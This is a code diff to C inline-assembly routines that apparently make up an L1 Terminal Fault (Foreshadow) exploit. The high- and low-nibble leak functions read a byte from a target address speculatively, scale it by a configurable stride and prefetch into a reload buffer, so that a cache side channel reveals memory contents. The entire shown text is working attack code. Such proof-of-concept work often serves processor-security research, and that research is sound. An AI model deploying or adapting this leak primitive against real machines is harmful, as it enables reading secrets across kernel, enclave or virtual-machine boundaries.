@@ -23,37 +23,39 @@ typedef uint8_t full_reload_buffer_t[AMOUNT_OF_BYTE_OPTIONS][PAGE_SIZE];
 static inline __attribute__((always_inline)) void asm_l1tf_leak_high_nibble(void *leak_addr,
                                                                             reload_buffer_t reload_buffer) {
   __asm__ volatile("xor %%rax, %%rax\n"
+                   "movl %[stride], %%ecx\n"
                    "movl $0xB1ABE849, %%r12d\n"
                    "movl $0xCD7E16F1, %%r13d\n"
                    "leaq handler%=(%%rip), %%r14\n"
                    "movb (%[leak_addr]), %%al\n"
                    "and $0xf0, %%al\n"
-                   "shl $0x8, %%ax\n"
+                   "mulw %%cx\n"
                    "prefetcht0 (%[nibble], %%rax)\n"
                    "mfence\n"
                    "handler%=:"
 
                    ::[leak_addr] "r"(leak_addr),
-                   [nibble] "r"(reload_buffer[0])
-                   : "rax", "r12", "r13", "r14");
+                   [nibble] "r"(reload_buffer[0]), [stride] "i"(STRIDE / 16)
+                   : "rax", "r12", "r13", "r14", "rcx", "cc");
 }
 
 static inline __attribute__((always_inline)) void asm_l1tf_leak_low_nibble(void *leak_addr,
                                                                            reload_buffer_t reload_buffer) {
   __asm__ volatile("xor %%rax, %%rax\n"
+                   "movl %[stride], %%ecx\n"
                    "movl $0xB1ABE849, %%r12d\n"
                    "movl $0xCD7E16F1, %%r13d\n"
                    "leaq handler%=(%%rip), %%r14\n"
                    "movb (%[leak_addr]), %%al\n"
                    "and $0x0f, %%al\n"
-                   "shl $0xc, %%ax\n"
+                   "mulw %%cx\n"
                    "prefetcht0 (%[nibble], %%rax)\n"
                    "mfence\n"
                    "handler%=:"
 
                    ::[leak_addr] "r"(leak_addr),
-                   [nibble] "r"(reload_buffer[0])
-                   : "rax", "r12", "r13", "r14");
+                   [nibble] "r"(reload_buffer[0]), [stride] "i"(STRIDE)
+                   : "rax", "r12", "r13", "r14", "rcx", "cc");
 }
 
 static inline __attribute__((always_inline)) void asm_l1tf_leak_nibbles(void *leak_addr,
